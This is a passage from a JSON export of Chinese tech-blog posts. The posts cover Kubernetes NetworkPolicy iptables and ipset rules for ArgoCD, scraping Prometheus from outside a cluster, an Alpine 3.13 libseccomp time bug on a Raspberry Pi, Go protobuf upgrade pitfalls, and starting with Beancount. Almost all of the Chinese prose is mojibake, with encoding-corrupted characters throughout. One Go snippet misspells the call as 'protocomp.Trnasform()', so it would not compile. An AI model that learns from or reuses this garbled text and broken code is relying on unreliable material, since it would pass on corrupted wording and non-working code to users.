KUBE-NWPLCY-5VLCZNPWIAXAL2HB -p tcp -m set --match-set KUBE-SRC-MLGAJX4FU64MJPWH src -m set --match-set KUBE-DST-DM6ZQPCTKCXEROGZ dst -m tcp --dport 8082 -m comment --comment \"rule to mark traffic matching a network policy\" -m comment --comment \"rule to ACCEPT traffic from specified ipBlocks to dest pods selected by policy name: argocd-application-controller-network-policy namespace argocd\" -j MARK --set-xmark 0x10000/0x10000-A KUBE-NWPLCY-5VLCZNPWIAXAL2HB -p tcp -m set --match-set KUBE-SRC-MLGAJX4FU64MJPWH src -m set --match-set KUBE-DST-DM6ZQPCTKCXEROGZ dst -m tcp --dport 8082 -m comment --comment \"rule to RETURN traffic matching a network policy\" -m mark --mark 0x10000/0x10000 -m comment --comment \"rule to ACCEPT traffic from specified ipBlocks to dest pods selected by policy name: argocd-application-controller-network-policy namespace argocd\" -j RETURNipset è§„åˆ™å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637# ç¬¬ä¸€æ¡ namespaceSelector è§„åˆ™Name: KUBE-SRC-DRBIHPAD4OLOF546Type: hash:ipRevision: 4Header: family inet hashsize 1024 maxelem 65536 timeout 0Size in memory: 1008References: 4Number of entries: 16Members:10.42.0.41 timeout 010.42.0.40 timeout 0# åé¢çš„ pod ip åœ°å€ç•¥# ç¬¬äºŒæ¡ ipblock cidr è§„åˆ™Name: KUBE-SRC-MLGAJX4FU64MJPWHType: hash:netRevision: 6Header: family inet hashsize 1024 maxelem 65536 timeout 0Size in memory: 440References: 4Number of entries: 1Members:192.168.1.0/24 timeout 0# ç›®æ ‡åœ°å€è§„åˆ™ï¼ˆNetworkPolicy ä¸­ podSelector åˆ—å‡ºçš„æ‰€æœ‰ IPï¼‰# podSelector:# matchLabels:# app.kubernetes.io/name: argocd-application-controllerName: KUBE-DST-DM6ZQPCTKCXEROGZType: hash:ipRevision: 4Header: family inet hashsize 1024 maxelem 65536 timeout 0Size in memory: 168References: 8Number of entries: 1Members:10.42.0.38 timeout 0â€¦â€¦ æ€»ç»“ä»é›†ç¾¤å¤–è®¿é—®é›†ç¾¤å†…çš„æ¥å£æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œå¦‚æœæ˜¯ä¸€èˆ¬çš„ä¸šåŠ¡éœ€æ±‚ï¼Œæˆ‘ä»¬é€šå¸¸è¿˜æ˜¯ä¼šç”¨ Service / Ingress æ¥å®Œæˆã€‚ä½†ä¸ºäº†ç®€åŒ–é…ç½®ï¼Œä½¿ç”¨é›†ç¾¤å±‚é¢çš„æœåŠ¡å‘ç°ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç»•äº›å¼¯è·¯æ¥è®¿é—®æŒ‡æ ‡æ¥å£ã€‚å¦‚æœå®åœ¨æ˜¯å¸Œæœ›åœ¨é›†ç¾¤å¤–æ”¶é›†æŒ‡æ ‡çš„è¯ï¼ˆæ¯”å¦‚ä½¿ç”¨äº†æŒ‡æ ‡æ”¶é›†çš„ PaaS æœåŠ¡ï¼Œå¦‚é˜¿é‡Œäº‘ SLSï¼‰ï¼Œé‚£ä¹ˆä»å®‰å…¨æ€§å’Œä¾¿æ·æ€§å‡ºå‘ï¼Œæˆ‘è®¤ä¸ºæœ€åˆç†çš„æ¶æ„è¿˜æ˜¯åº”è¯¥åœ¨ K8S é›†ç¾¤å†…éƒ¨ç½²ä¸€ä¸ª Prometheus ç”¨äºé›†ç¾¤å†…çš„æŒ‡æ ‡æŠ“å–ã€‚é›†ç¾¤å†…çš„ Prometheus å¯ä»¥é€šè¿‡ Service / Ingress å°†æš´éœ²å‡ºæ¥ï¼Œè¿™æ ·é›†ç¾¤å¤–çš„ Prometheus å®ä¾‹å¯ä»¥é€šè¿‡ federate æ¥å£ç›´æ¥æŠ“å–åˆ°é›†ç¾¤å†… Prometheus çš„æŒ‡æ ‡ã€‚ç”±äºé›†ç¾¤å†…çš„ Prometheus ä¸»è¦ç”¨äºæŠ“å–å’Œæ•°æ®è½¬å‘ï¼Œæ‰€ä»¥æ— éœ€ä¿ç•™è¿‡å¤šæ•°æ®ï¼Œä¹Ÿä¸éœ€è¦å¤ªå…³æ³¨æŒä¹…åŒ–å› ç´ ã€‚é‚£ä¹ˆï¼ŒæŠ˜è…¾äº†åŠå¤©ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¦åœ¨é›†ç¾¤å¤–æŠ“å–é›†ç¾¤å†…çš„æŒ‡æ ‡å‘¢ã€‚ å‚è€ƒèµ„æ–™é™¤äº† Kubernetes å’Œ Prometheus å®˜ç½‘å¤–ï¼Œæˆ‘è¿˜å‚è€ƒäº†ä»¥ä¸‹é¡µé¢ï¼šPrometheus kuberenetes_sd_config ç¤ºä¾‹Prometheus RBAC é…ç½®ã€ŠåŠå…¬ç¯å¢ƒä¸‹ kubernetes ç½‘ç»œäº’é€šæ–¹æ¡ˆã€‹ã€Šæ‰“é€š Kubernetes å†…ç½‘ä¸å±€åŸŸç½‘çš„Nç§æ–¹æ³•ã€‹","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"Prometheus","slug":"Prometheus","permalink":"https://blog.stdioa.com/tags/Prometheus/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://blog.stdioa.com/tags/Kubernetes/"},{"name":"iptables","slug":"iptables","permalink":"https://blog.stdioa.com/tags/iptables/"}]},{"title":"ç”± TT-RSS è§£ææ•°æ®åº“åœ°å€å¤±è´¥å¼•å‡ºçš„ä¸€ä¸ªé—®é¢˜","slug":"alpine-time-call","date":"2021-02-23T12:51:14.000Z","updated":"2021-02-23T12:59:07.255Z","comments":true,"path":"2021/02/alpine-time-call/","link":"","permalink":"https://blog.stdioa.com/2021/02/alpine-time-call/","excerpt":"æ°´ä¸€ç¯‡æ–‡ç« ï¼Œä¸»è¦ç”¨æ¥å‘Šè¯«è‡ªå·±è®¤çœŸçœ‹æ–‡æ¡£ã€‚ğŸŒš","text":"æ°´ä¸€ç¯‡æ–‡ç« ï¼Œä¸»è¦ç”¨æ¥å‘Šè¯«è‡ªå·±è®¤çœŸçœ‹æ–‡æ¡£ã€‚ğŸŒš èƒŒæ™¯ä¸‹åˆéšæ‰‹åœ¨æ ‘è“æ´¾ä¸Šå‡çº§äº†ä¸€ä¸‹ TT-RSS çš„é•œåƒï¼Œç„¶åå®ƒå½“åœºçˆ†ç‚¸ï¼Œçœ‹äº†å®¹å™¨æ—¥å¿—å‘Šè¯‰æˆ‘ PHP æ— æ³•è§£ææ•°æ®åº“çš„åŸŸå database.postgres. å°è¯•è§£å†³è¿›åˆ°å®¹å™¨é‡Œå°è¯•æ‰‹åŠ¨è§£æä¸€ä¸‹ï¼Œä½†æ˜¯æŠ¥é”™ nslookup: clock_gettime(MONOTONIC) failed.ç”¨è‡ªå·±çš„å¦ä¸€å°è¿è¡Œ Debian testing çš„ x86 æœºå™¨è¿è¡Œäº†ä¸€ä¸‹ï¼Œæ— æ³•å¤ç°è¿™ä¸ªé—®é¢˜ã€‚Google äº†ä¸€ä¸‹æ‰¾åˆ° Alpine çš„ä¸€ä¸ª issueï¼Œç®€å•çœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯ Alpine 3.13 å‡çº§äº† muslï¼Œä½¿ç”¨äº†æ–°çš„ç³»ç»Ÿè°ƒç”¨ clock_gettime64. åœ¨å®¹å™¨é‡Œè·‘äº†ä¸‹ dateï¼Œç»“æœå¦‚ä¸‹ï¼š12$ docker run --rm -it alpine dateSun Jan 0 00:100:4174038 1900çœ‹èµ·æ¥ï¼ŒAlpine 3.13 éœ€è¦ Docker 19.03.9. ç„¶è€Œæˆ‘çš„ docker ç‰ˆæœ¬å·²ç»æ˜¯ 20.10.3 äº†ï¼Œä½†ä¾ç„¶æ— æ³•è¿è¡Œã€‚Google äº†ä¸€å¤§åœˆå‘ç°æ ‘è“æ´¾ä¸Šå®‰è£…çš„ libsecomp2 å¤ªè€ï¼ˆ2.3.3-4ï¼‰ï¼Œä¸æ”¯æŒ time64ï¼Œå°è¯•è¿è¡Œ scmp_sys_resolver -a arm clock_gettime64 è¿”å› -1 ä¹ŸéªŒè¯äº†è¿™ä¸ªè§‚ç‚¹ã€‚PSï¼šéœ€è¦å®‰è£… seccomp åŒ…ã€‚æ‰€ä»¥éœ€è¦å®‰è£…æ›´æ–°ç‰ˆæœ¬çš„ libseccomp2ï¼Œä½† Raspbian ä¸æä¾›æ–°ç‰ˆçš„åŒ…ã€‚æ‰€ä»¥ï¼Œæˆ‘ä» Debian è½¯ä»¶åŒ…ç›®å½• æ‰¾äº†æ–°ç‰ˆï¼ˆ2.5.1-1ï¼‰æ¥å®‰è£…ï¼Œé—®é¢˜è§£å†³ã€‚ ä¸ä»”ç»†çœ‹è‹±æ–‡æ–‡æ¡£çš„åæœAlpine çš„ release notes å·²ç»å†™æ˜äº†é—®é¢˜ï¼šTherefore, Alpine Linux 3.13.0 requires the host Docker to be version 19.03.9 (which contains backported moby commit 89fabf0) or greater and the host libseccomp to be version 2.4.2 (which contains backported libseccomp commit bf747eb) or greater.Therefore, the following platforms are not suitable as Docker hosts for 32-bit Alpine Linux 3.13.0, due to containing out-of-date libseccomp: Amazon Linux 1 or 2, CentOS 7 or 8, Debian stable without debian-backports, Raspbian stable, Ubuntu 14.04 or earlier, and Windows. This applies regardless of whether the Linux distribution Docker packages or separate Docker package repositories are used.æ ‘è“æ´¾çš„ Docker èƒ½å¤Ÿæ»¡è¶³æ¡ä»¶ï¼Œä½†å› ä¸ºè¿è¡Œçš„æ˜¯ Raspbian stableï¼Œæ‰€ä»¥ libseccomp çš„ç‰ˆæœ¬æ— æ³•æ»¡è¶³ï¼›Debian testing çš„æœºå™¨æ˜¯ 64 ä½çš„ï¼Œæ‰€ä»¥å¯ä»¥æ­£å¸¸è¿è¡Œã€‚ ç»“è®ºAlpine å‡çº§äº† musl â†’ ä½¿ç”¨äº†æ–°çš„ç³»ç»Ÿè°ƒç”¨ â†’ å¦‚æœç³»ç»Ÿæ˜¯ 32 ä½ç‰ˆæœ¬ï¼Œä¸” Docker å’Œ libsecccomp2 ç‰ˆæœ¬è¾ƒä½ï¼Œåˆ™æ— æ³•åœ¨å®¹å™¨ä¸­æ­£å¸¸è·å–æ—¶é—´ï¼Œè¿›è€Œå½±å“åˆ°å„ç§åŠŸèƒ½ã€‚å‡çº§ Docker åˆ° 19.03.9 åŠä»¥ä¸Šï¼›å‡çº§ libseccomp2 åˆ° 2.4.2 åŠä»¥ä¸Šï¼Œå¦‚æœå®˜æ–¹è½¯ä»¶æºæ²¡æœ‰æä¾›çš„è¯å¯ä»¥å» testing åº“é‡Œæ‰¾æ‰¾ï¼›è§£å†³è¿™ä¸ªé—®é¢˜èŠ±äº†å¤§åŠä¸ªå°æ—¶ï¼Œä½†å¦‚æœä»”ç»†çœ‹æ–‡æ¡£çš„è¯ä¼°è®¡ 5 åˆ†é’Ÿå°±èƒ½æå®šã€‚æ‰€ä»¥ï¼Œè¦è®¤çœŸçœ‹è‹±æ–‡æ–‡æ¡£ã€‚ å‚è€ƒæ–‡æ¡£Release Notes for Alpine 3.13.0alpine 3.13 åœ¨ Armhf docker çš„ç½‘ç»œé—®é¢˜Docker ä½¿ç”¨ seccomp æ— æ³•è·å–ç³»ç»Ÿæ—¶é—´çš„ bug ä¸€åˆ™","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.stdioa.com/tags/Docker/"},{"name":"Alpine","slug":"Alpine","permalink":"https://blog.stdioa.com/tags/Alpine/"},{"name":"æ ‘è“æ´¾","slug":"æ ‘è“æ´¾","permalink":"https://blog.stdioa.com/tags/æ ‘è“æ´¾/"}]},{"title":"protobuf å‡çº§åå¸¦æ¥çš„ä¸€äº›å‘","slug":"protobuf-upgrade","date":"2020-12-27T06:41:53.000Z","updated":"2020-12-27T06:53:32.741Z","comments":true,"path":"2020/12/protobuf-upgrade/","link":"","permalink":"https://blog.stdioa.com/2020/12/protobuf-upgrade/","excerpt":"å‰æ®µæ—¶é—´æŠŠå…¬å¸æŸé¡¹ç›®ä¾èµ–çš„ github.com/golang/protobuf çš„ç‰ˆæœ¬ä» v1.3.3 å‡çº§åˆ°äº† v1.4.2ï¼Œæœ¬æ–‡è®°å½•äº†å‡çº§è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚","text":"å‰æ®µæ—¶é—´æŠŠå…¬å¸æŸé¡¹ç›®ä¾èµ–çš„ github.com/golang/protobuf çš„ç‰ˆæœ¬ä» v1.3.3 å‡çº§åˆ°äº† v1.4.2ï¼Œæœ¬æ–‡è®°å½•äº†å‡çº§è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚Google å¯¹ Go çš„ protobuf åº“çš„åº•å±‚è¿›è¡Œäº†å¤§çš„æ”¹è¿›ï¼Œæ–°ç‰ˆæœ¬çš„åŒ…è·¯å¾„è½¬ç§»åˆ°äº† google.golang.org/protobuf.åŒæ—¶ï¼Œè¿™äº›æ”¹è¿›ä¹Ÿè¢«å¸¦è¿›äº† github.com/golang/protobufï¼šä» v1.4 ç‰ˆæœ¬èµ·ï¼Œgithub.com/golang/protobuf ä¼šåœ¨ google.golang.org/protobuf çš„åŸºç¡€ä¸Šå®ç°ï¼Œä½†ä¼šä¿è¯æ¥å£å…¼å®¹ï¼Œè¿™ä¹Ÿè¡¨æ˜å½“å‰ä¾èµ– github.com/golang/protobuf çš„é¡¹ç›®å¯ä»¥ç›´æ¥å‡çº§ç‰ˆæœ¬ï¼Œè€Œæ— éœ€å¯¹ä¸Šå±‚ä»£ç è¿›è¡Œæ”¹åŠ¨ã€‚ç„¶è€Œï¼Œæ–°ç‰ˆçš„ protobuf-gen-go ä½¿ç”¨äº† google.golang.org/protobuf/protoreflectï¼Œç¼–è¯‘å‡ºçš„ message ç»“æ„ä½“ä¸ä¹‹å‰å®Œå…¨ä¸åŒï¼Œè¿™ç»™æˆ‘ä»¬çš„å‡çº§å·¥ä½œå¸¦æ¥äº†ä¸€äº›éº»çƒ¦ã€‚ 1. ä»£ç ä¸­å¯¹ XXX_Unmarshal çš„ç›´æ¥è°ƒç”¨è€ç‰ˆçš„ protoc-gen-go ä¼šæš´éœ²ä¸€ä¸ª XXX_Unmarshal æ¥å£ï¼Œç”¨äºåœ¨ proto.Unmarshal æ—¶è¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥æœ‰ä¸€äº›åŒäº‹é€‰æ‹©ä¼šç›´æ¥è°ƒç”¨ message.XXX_Unmarshal æ–¹æ³•ã€‚æ–°ç‰ˆçš„ proto é€šè¿‡ ProtoReflect æ¥å£æš´éœ² message å†…éƒ¨ä¿¡æ¯ï¼Œç¼–è¯‘ pb.go æ—¶ä¹Ÿæ²¡æœ‰äº† XXX_Unmarshal æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´ç¼–è¯‘æ—¶æŠ¥é”™ message.XXX_Unmarshal undefined.è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼šæ”¹ç”¨ proto.Unmarshal å³å¯ã€‚ 2. ç»“æ„ä½“å†…éƒ¨ç»“æ„å˜åŒ–å¯¼è‡´æµ‹è¯•å‡ºé”™é’ˆå¯¹åŒä¸€ä¸ª messageï¼Œè€ç‰ˆæœ¬ç¼–è¯‘åçš„ç»“æ„ä½“ç»“æ„å¦‚ä¸‹:123456type HealthCheckResponse struct &#123; Status HealthCheckResponse_ServingStatus `protobuf:\"varint,1,opt,name=status,proto3,enum=liulishuo.common.health.v1.HealthCheckResponse_ServingStatus\" json:\"status,omitempty\"` XXX_NoUnkeyedLiteral struct&#123;&#125; `json:\"-\"` XXX_unrecognized []byte `json:\"-\"` XXX_sizecache int32 `json:\"-\"`&#125;è€Œæ–°ç‰ˆæœ¬ç¼–è¯‘åçš„ç»“æ„å¦‚ä¸‹ï¼š1234567type HealthCheckResponse struct &#123; state protoimpl.MessageState sizeCache protoimpl.SizeCache unknownFields protoimpl.UnknownFields Status HealthCheckResponse_ServingStatus `protobuf:\"varint,1,opt,name=status,proto3,enum=liulishuo.common.health.v1.HealthCheckResponse_ServingStatus\" json:\"status,omitempty\"`&#125;å¯ä»¥çœ‹åˆ°ï¼Œæ–°ç‰ˆæœ¬ä¸­æ·»åŠ äº†ä¸‰ä¸ªæœªå¯¼å‡ºå­—æ®µï¼Œè€Œè¿™ä¸‰ä¸ªå­—æ®µä¸ºæˆ‘ä»¬çš„æµ‹è¯•ä»£ç å¸¦æ¥äº†ä¸€äº›éº»çƒ¦ã€‚cmp.Equal æ—¶ panicæˆ‘ä»¬çš„æµ‹è¯•ä¸­ä½¿ç”¨äº† github.com/google/go-cmp/cmp.Equal æ¥å¯¹ proto ç»“æ„ä½“è¿›è¡Œæ¯”è¾ƒï¼Œè€Œç»“æ„ä½“ä¸­çš„æœªå¯¼å‡ºå­—æ®µä¼šè®© cmp.Equal å’Œ cmp.Diff panic:123panic: cannot handle unexported field at &#123;*pkg.SomeRequest&#125;.state: &quot;.../services_go_proto&quot;.SomeRequestconsider using a custom Comparer; if you control the implementation of type, you can also consider using an Exporter, AllowUnexported, or cmpopts.IgnoreUnexported [recovered]go-cmp æ¨èçš„æ–¹å¼æ˜¯ä½¿ç”¨ IgnoreUnexportedï¼Œä½†è¿™ç§æ–¹å¼éœ€è¦ä¼ é€’æ‰€æœ‰éœ€è¦å¿½ç•¥çš„ç±»å‹ï¼Œå¯¹å«æœ‰å¤šå±‚åµŒå¥—çš„ message éå¸¸ä¸å‹å¥½ã€‚ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œå‘ç° protocmp.Transform å¯ä»¥å°†æ‰€æœ‰çš„ protobuf message è½¬æ¢æˆè‡ªå®šä¹‰çš„ map[string]interface{} è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ Transform() æ¥è§£å†³é—®é¢˜ï¼š1234567import \"google.golang.org/protobuf/testing/protocmp\"// ...opt := protocomp.Trnasform()if !cmp.Equal(exp, got, opt) &#123; t.Error(exp, got, opt)&#125;assert å¡æ­»å¹¶å æ»¡å†…å­˜ç›¸æ¯”ä¸Šé¢çš„é—®é¢˜ï¼Œä¸‹é¢çš„é—®é¢˜æ›´åŠ å¥‡æ€ªï¼šä½¿ç”¨ github.com/stretchr/testify/assert.Equal æ¯”è¾ƒæŸäº›ç‰¹æ®Šçš„ proto message æ—¶ä¼šå¡æ­»ï¼ŒåŒæ—¶å†…å­˜å ç”¨ä¼šæš´æ¶¨ã€‚å°è¯•ç”¨ pprof å–æ ·ï¼Œå–å‡ºæ¥çš„ CPU å’Œå †é‡‡æ ·å›¾é•¿è¿™æ ·ï¼šå¯ä»¥çœ‹åˆ° spew.Dump ä¸­å­˜åœ¨æ— é™é€’å½’ï¼Œè¿™å¯¼è‡´äº†ç¨‹åºå¡æ­»ä»¥åŠæŒç»­çš„å†…å­˜åˆ†é…ã€‚éšåæœåˆ°äº†testify çš„ issueï¼Œç›¸å…³è¯„è®ºä¸­æå‡ºäº†å‡ ç§ç»•è¿‡çš„æ–¹æ¡ˆï¼Œç„¶è€Œè¿™ä¸ªé—®é¢˜è‡³ä»Šæ²¡æœ‰è§£å†³ã€‚ä¸ªäººæ¨èçš„è§£å†³æ–¹å¼æœ‰ä¸¤ç§ï¼šä½¿ç”¨ marshalTextString() å°† message è½¬æ¢æˆ proto textï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼›ä½¿ç”¨ cmp.Equalï¼Œç»“åˆ protocmp.Transform. 3. lint æŠ¥é”™ copylockså¤„ç†å®Œä¸šåŠ¡ä»£ç å¤„ç†æµ‹è¯•ï¼Œå¤„ç†å®Œæµ‹è¯•ä»£ç è¿˜æœ‰ lint è¦å¤„ç†ã€‚æˆ‘ä»¬çš„é¡¹ç›®åœ¨å‡çº§å®Œåï¼Œgo vet ä¼šæŠ¥ copylocks é”™è¯¯ï¼šassignment copies lock value to got: .../message_go_protos.Message contains google.golang.org/protobuf/internal/impl.MessageState contains sync.Mutexè§£å†³æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼šå°†æ‰€æœ‰ proto message æ”¹ä¸ºæŒ‡é’ˆä¼ é€’å³å¯ã€‚","categories":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://blog.stdioa.com/tags/Golang/"},{"name":"Protobuf","slug":"Protobuf","permalink":"https://blog.stdioa.com/tags/Protobuf/"}]},{"title":"å¼€å§‹ä½¿ç”¨ Beancount","slug":"using-beancount","date":"2020-09-05T07:15:00.000Z","updated":"2021-08-04T02:58:19.600Z","comments":true,"path":"2020/09/using-beancount/","link":"","permalink":"https://blog.stdioa.com/2020/09/using-beancount/","excerpt":"ä½¿ç”¨ Beancount è®°è´¦å·²ç»æœ‰å°†è¿‘ä¸¤ä¸ªæœˆäº†ï¼Œç®€å•å†™ä¸€å†™æˆ‘éƒ½åšäº†ä»€ä¹ˆã€‚","text":"ä½¿ç”¨ Beancount è®°è´¦å·²ç»æœ‰å°†è¿‘ä¸¤ä¸ªæœˆäº†ï¼Œç®€å•å†™ä¸€å†™æˆ‘éƒ½åšäº†ä»€ä¹ˆã€‚æ³¨ï¼šæœ¬æ–‡åªæ˜¯ä¸€ä¸ªæµæ°´è´¦ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ª Beancount ä½¿ç”¨æ•™ç¨‹ï¼Œå¦‚æœæƒ³è¯¦ç»†äº†è§£ Beancount çš„è¯ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢æåˆ°çš„é‚£äº›æ–‡ç« ã€‚ ä¸€äº›èƒŒæ™¯ Beancount æ˜¯ä»€ä¹ˆå¦‚ä¸Šæ–‡æ‰€è¯´ï¼ŒBeancount æ˜¯ä¸€ä¸ªè®°è´¦å·¥å…·ï¼Œæ›´å‡†ç¡®äº›æ¥è®²ï¼Œæ˜¯ä¸€ä¸ªå¤å¼è®°è´¦å·¥å…·ã€‚ä½†ç›´åˆ°æˆ‘å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™æ‰å‘ç°å®˜æ–¹å°†å…¶å®šä¹‰ä¸ºâ€œä¸€ç§å¤å¼è®°è´¦è®¡ç®—æœºè¯­è¨€â€ã€‚ç®€å•æ¥è®²ï¼Œå®ƒå¯ä»¥è®©ä½ ä»¥çº¯æ–‡æœ¬æ–¹å¼è®°è´¦ï¼Œå¹¶é€šè¿‡ä¸€ç§ç±» SQL çš„è¯­è¨€æ¥å¯¹äº¤æ˜“è¿›è¡ŒæŸ¥è¯¢ã€‚è®°è´¦æ–‡ä»¶è¿˜å¯ä»¥é…åˆ Git è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ã€‚æ­¤å¤–ï¼ŒBeancount å®˜æ–¹æä¾›äº†ä¸€ä¸ªåå« fava çš„å›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œå®ƒåŸºäº Webï¼Œèƒ½å¤Ÿæä¾›æ¯”åŸç”Ÿé¡µé¢æ›´åŠ ä¸°å¯Œçš„å†…å®¹ï¼Œä¸€èˆ¬è®°è´¦æ‰€éœ€è¦çš„ä¿¡æ¯ä¸€ç›®äº†ç„¶ã€‚æƒ³ä½“éªŒçš„åŒå­¦å¯ä»¥åœ¨å®˜æ–¹æä¾›çš„ Demo ä¸­ç®€å•æ„Ÿå—ä¸‹ã€‚ ä¸ºä»€ä¹ˆè¦ç”¨å®ƒæˆ‘ä» 17 å¹´èµ·å°±åœ¨ç”¨å£è¢‹è®°è´¦ App æ¥éšæ‰‹è®°è´¦ã€‚ä½†æ¯•ç«Ÿäººå®¶ä¹Ÿæ˜¯å•†ä¸šå…¬å¸ï¼Œæ‰€ä»¥ App é‡Œé€æ¸å‡ºç°äº†ä¸å°‘çš„ç†è´¢äº§å“ ğŸŒšï¼Œè€Œä¸” App æ‰“å¼€è¶Šæ¥è¶Šå¡äº†ã€‚äºæ˜¯å°±å¼€å§‹è€ƒè™‘å…¶å®ƒçš„è®°è´¦æ–¹æ¡ˆã€‚æƒ³äº†æƒ³ï¼Œæˆ‘çš„è®°è´¦éœ€æ±‚æœ‰ï¼šå¿«é€Ÿå¯¹åˆšåˆšäº§ç”Ÿçš„äº¤æ˜“è¿›è¡Œè®°å½•ï¼Œä¸€å®šè¦æ¯”å£è¢‹è®°è´¦å¿«ï¼æŸ¥çœ‹å„ä¸ªç²’åº¦çš„æ”¶æ”¯ç»Ÿè®¡æŸ¥è´¦æ–¹ä¾¿æ•°æ®å®‰å…¨ï¼ˆè¦èƒ½å¤Ÿå¤‡ä»½ï¼‰ä¹‹å‰æœ‰äº†è§£è¿‡ GNUCashï¼Œä½†æ˜¯ä¸å¤ªæ„Ÿå†’ã€‚åœ¨è¿™æœŸé—´ä¹Ÿå¤šæ¬¡æƒ³è¿‡è‡ªå·±å»å†™ä¸€ä¸ªè®°è´¦å·¥å…·ï¼Œä½†ä¸€ç›´æ‡’å¾—åŠ¨æ‰‹é€ è½®å­ã€‚ä¹‹å‰åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªç©ç¬‘è¯´â€œæ¯ä¸€ä¸ªç¨‹åºå‘˜éƒ½æƒ³è¿‡å»å†™ä¸€ä¸ªè®°è´¦å·¥å…·â€ï¼Œæˆ‘ä¹Ÿä¸ä¾‹å¤–ã€‚ç›´åˆ°ä¸ƒæœˆä»½ï¼Œçœ‹åˆ°èµµç¥åœ¨ä»–çš„ Channel é‡Œæåˆ°äº† Beancountï¼Œåœ¨ä»–çš„å®‰åˆ©ä¸‹ï¼Œæˆ‘å‘ç°å®ƒéå¸¸è½»ä¾¿ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚äºæ˜¯åœ¨æŸä¸ªå‘¨æ—¥çš„å‚æ™šçš„å†²åŠ¨ä¹‹ä¸‹ï¼Œå†³å®šæŠŠå£è¢‹è®°è´¦çš„æ•°æ®è½¬ç§»åˆ° Beancount ä¸Šï¼Œä»æ­¤ç”¨å®ƒæ¥è®°è´¦ã€‚ çœ‹äº†äº›ä¸œè¥¿åœ¨åŠ¨æ‰‹ä¹‹å‰ä¹Ÿé¡ºç€èµµç¥çš„å®‰åˆ©å»çœ‹äº†ä¸€ä¸‹ä»–äººå†™çš„åšå®¢ï¼Œå¹¶äº†è§£äº†ä¸€ä¸‹ä¼šè®¡æ’ç­‰å¼ï¼Œä»¥åŠå¤å¼è®°è´¦çš„åŸºæœ¬çŸ¥è¯†ã€‚ä»¥ä¸‹æ˜¯æˆ‘çœ‹è¿‡çš„åšæ–‡ã€‚BYVoid å†™çš„ Beancount ç³»åˆ—æ–‡ç« ï¼šBeancountå¤å¼è®°è´¦ï¼ˆä¸€ï¼‰ï¼šä¸ºä»€ä¹ˆBeancountå¤å¼è®°è´¦ï¼ˆäºŒï¼‰ï¼šå€Ÿè´·è®°è´¦æ³•Beancountå¤å¼è®°è´¦ï¼ˆä¸‰ï¼‰ï¼šç»“ä½™ä¸èµ„äº§Beancountå¤å¼è®°è´¦ï¼ˆå››ï¼‰ï¼šé¡¹ç›®ç®¡ç†Beancount â€”â€” å‘½ä»¤è¡Œå¤å¼ç°¿è®°Beancount æœ€ä½³å®è·µBeancountä½¿ç”¨ç»éªŒ â€”â€” é€šè¿‡Beancountå¯¼å…¥æ”¯ä»˜å®&amp;å¾®ä¿¡csvè´¦å• åšäº†ç‚¹å·¥ä½œçœ‹äº†äº›ä¸œè¥¿ä»¥åï¼Œå¯¹ Beancount çš„ä½¿ç”¨ï¼Œä»¥åŠè®°è´¦é¡¹ç›®ç®¡ç†æœ‰äº†åŸºæœ¬çš„æ¦‚å¿µï¼Œå°±å¼€å§‹åŠ¨æ‰‹äº†ã€‚æˆ‘å†³å®šæŠŠ Beancount å®‰è£…åœ¨æˆ‘çš„æ ‘è“æ´¾ä¸Šï¼Œç”¨ fava åšç»Ÿè®¡åˆ†æï¼Œç”¨ Git åšç‰ˆæœ¬æ§åˆ¶åŠæ•°æ®å¤‡ä»½ã€‚Git è¿œç«¯åŒæ ·åœ¨æ ‘è“æ´¾ä¸Šï¼Œæ˜¯ä¸€ä¸ª Gitea å®ä¾‹ã€‚å†™åˆ°è¿™è¿˜æƒ³èµ·æ¥å»å¹´ä» Gogs è¿ç§»åˆ°äº† Giteaï¼Œå½“æ—¶è®°äº†ä¸‹è¿‡ç¨‹ä½†æ˜¯å†…å®¹å¤ªå°‘äº†ï¼Œå°±æ²¡æœ‰å‘å‡ºæ¥ã€‚ğŸ˜‚ å®‰è£…åŠéƒ¨ç½²python3 -m pip install beancount favaï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚ä¹‹å‰å¾ˆå¤šæœåŠ¡éƒ½æ˜¯ç”¨ Docker éƒ¨ç½²çš„ï¼Œä½†æ˜¯æˆ‘çš„ Python æœåŠ¡ä¸€ç›´æ²¡æœ‰ç”¨ Docker éƒ¨ç½²ï¼Œè€Œæ˜¯ç›´æ¥è£…åœ¨äº†ç³»ç»Ÿé‡Œï¼Œç”¨ systemd æ‰˜ç®¡ï¼Œå¯èƒ½æ˜¯æˆ‘çš„æŸç§æ‰§å¿µå§ã€‚Beancount æœ¬èº«ä¸éœ€è¦å®ˆæŠ¤è¿›ç¨‹ï¼Œå› 